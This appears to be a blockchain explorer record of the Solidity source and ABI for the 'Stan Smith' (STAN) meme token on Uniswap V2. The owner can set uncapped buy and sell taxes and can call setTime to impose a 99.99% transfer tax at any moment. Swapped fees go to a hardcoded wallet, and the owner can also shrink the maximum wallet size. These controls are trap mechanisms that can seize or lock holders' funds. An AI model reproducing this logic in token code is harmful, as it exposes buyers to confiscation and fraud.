{"SourceCode": "/*\r\n              Tg: https://t.me/StanSmithETH\r\n      Twitter: https://twitter.com/StanSmithETH\r\n    Website: https://StanSmithEth.com\r\n\r\n\r\n                              \u2800\u2800\u2800\u2800\u2830\u28f6\u28ff\u28ff\u28ff\u28f7\u28f6\u28f6\u28e6\u28c4\u2840\u2800\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2820\u2803\u2808\u283b\u28ff\u287f\u28bf\u28ff\u28ff\u28ff\u28ff\u2844\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28d4\u2801\u2810\u2884\u2800\u2800\u2880\u2824\u2804\u2852\u2809\u28f9\u28ff\u28ff\u2846\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2878\u2840\u2800\u2809\u285d\u2800\u2830\u2813\u2822\u2864\u2898\u2800\u28ff\u28ff\u28ff\u2847\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u2824\u2812\u2803\u2808\u2810\u285e\u2800\u2800\u2808\u2822\u2800\u2800\u281c\u2800\u28bb\u28ff\u28ff\u2801\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u28c0\u2814\u2802\u2801\u2800\u2800\u2800\u2800\u2886\u2840\u2811\u2812\u2812\u2802\u2800\u2880\u2860\u2804\u2840\u283b\u280f\u2802\u2847\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u28a0\u2805\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2812\u28e4\u28ed\u28ed\u28ed\u28e4\u28f4\u28f6\u28ff\u28ff\u2800\u2808\u284f\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u2850\u2801\u2800\u2800\u2800\u2800\u2800\u288e\u2801\u2800\u2800\u2809\u2809\u2809\u281b\u283b\u283f\u289f\u28c9\u283d\u2803\u2800\u2800\u2847\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u28b0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2830\u2840\u2847\u2800\u2800\u2800\u2800\r\n    \u28c0\u2824\u2814\u28a3\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u284f\u28a3\u28c0\u2800\u2800\u2800\r\n    \u2800\u2800\u2874\u2809\u28a2\u2800\u2800\u2800\u2820\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2860\u288a\u28f4\u28ff\u28ff\u28f7\u28e6\u28c0\r\n    \u2800\u2880\u28c8\u28d3\u28e4\u28f1\u2842\u2824\u2864\u28fc\u28e6\u2840\u2800\u2800\u2800\u2800\u2800\u28c0\u2820\u2804\u280a\u2881\u2814\u280b\u2800\u28b9\u28ff\u28ff\u28ff\u28ff\r\n    \u2800\u284f\u2800\u2800\u2800\u2838\u2849\u288a\u2814\u28fb\u28ff\u28ff\u2876\u2812\u2812\u2808\u2809\u2800\u2800\u2860\u2812\u2801\u2800\u2800\u2880\u287e\u280b\u2800\u2809\u281b\r\n    \u28c0\u28e7\u28c0\u2800\u2860\u280a\u2801\u2800\u281a\u281b\u280b\u2801\u28e8\u2800\u2818\u2804\u2890\u2816\u280b\u2800\u2824\u28b6\u28d2\u28cb\u2841\u2800\u2800\u2800\u2800\u2800\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: Unlicensed\r\npragma solidity 0.8.18;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \" multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"new owner is the zero address\");\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\n\r\ncontract STAN is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping(address => uint256) private _balance;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _isExcludedFromFeeWallet;\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _totalSupply = 10000000000 * 10**_decimals;\r\n\r\n    uint256 private constant percent = _totalSupply / 100;\r\n    uint256 public maxWallet = percent * 2;\r\n    uint256 private constant maxSell = percent * 5;\r\n\r\n    uint256 public buyTax = 0;\r\n    uint256 public sellTax = 0;\r\n\r\n    string private constant _name = \"Stan Smith\";\r\n    string private constant _symbol = \"STAN\";\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n    address payable private mW;\r\n    \r\n    uint256 private launchedAt;\r\n    uint256 private skipping = 0;\r\n    bool private tradingOpen = false;\r\n\r\n    uint256 private constant minSwap = percent / 20;\r\n    bool private inSwapAndLiquify;\r\n    modifier lockTheSwap {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n    constructor() {\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        mW = payable(0x4698dE30ec500C7da5075f549F19eF7389E903E2);\r\n        _isExcludedFromFeeWallet[owner()] = true;\r\n        _isExcludedFromFeeWallet[address(this)] = true;\r\n        _isExcludedFromFeeWallet[mW] = true;\r\n\r\n        _balance[owner()] = _totalSupply ;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balance[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)public override returns (bool){\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function sendEthToTaxWallet() external {\r\n        mW.transfer(address(this).balance);\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256){\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool){\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n     function setTime(uint256 t) external onlyOwner {\r\n        skipping = t;\r\n     }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,\"low allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0) && spender != address(0), \"approve zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"transfer zero address\");\r\n        uint256 _tax = 0;\r\n\r\n        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {\r\n            _tax = 0;\r\n        } else {\r\n            require(tradingOpen);\r\n            if (block.number<launchedAt+skipping) {_tax=99;} else {\r\n                if (to == uniswapV2Pair) {\r\n                    uint256 tokensSwap = balanceOf(address(this));\r\n                    if (tokensSwap > minSwap && !inSwapAndLiquify) {\r\n                        if (tokensSwap > maxSell) {\r\n                            tokensSwap = maxSell;\r\n                        }\r\n                        swapTokensEth(tokensSwap);\r\n                    }\r\n                    _tax = sellTax;\r\n                } else if (from == uniswapV2Pair) {\r\n                    require(balanceOf(to) + amount <= maxWallet, \"Max wallet limit\");\r\n                    _tax = buyTax;\r\n                }   else {\r\n                    _tax = 0;\r\n                }\r\n            }\r\n        }\r\n        uint256 taxTokens = 0;\r\n        if(_tax == 99){\r\n            taxTokens = (amount * 9999) / 10000;\r\n        }else{\r\n            taxTokens = (amount * _tax) / 100;\r\n        }\r\n        uint256 transferAmount = amount - taxTokens;\r\n\r\n        _balance[from] = _balance[from] - amount;\r\n        _balance[to] = _balance[to] + transferAmount;\r\n        _balance[address(this)] = _balance[address(this)] + taxTokens;\r\n\r\n        emit Transfer(from, to, transferAmount);\r\n    }\r\n\r\n    function setMaxWallet(uint256 _maxWalletAmount) external onlyOwner {\r\n        maxWallet = _maxWalletAmount * 10**_decimals;\r\n    }\r\n\r\n    function newTaxes(uint256 bTax, uint256 sTax) external onlyOwner {\r\n        buyTax = bTax;\r\n        sellTax = sTax;\r\n    }\r\n\r\n    function swapTokensEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,mW,block.timestamp);\r\n    }\r\n\r\n    function removeAllLimits() external onlyOwner {\r\n        maxWallet = _totalSupply;\r\n    }\r\n\r\n    function enableTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        tradingOpen = true;\r\n        launchedAt = block.number;\r\n    }\r\n\r\n    function addV2LP() external payable onlyOwner() {\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        _approve(address(this), address(uniswapV2Router), _totalSupply);\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"addV2LP\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sTax\",\"type\":\"uint256\"}],\"name\":\"newTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeAllLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sendEthToTaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_maxWalletAmount\",\"type\":\"uint256\"}],\"name\":\"setMaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"t\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "STAN", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://71793b435e8422504dbc3a0eab06d60d91408450114b703f6ca15f092cd483bb"}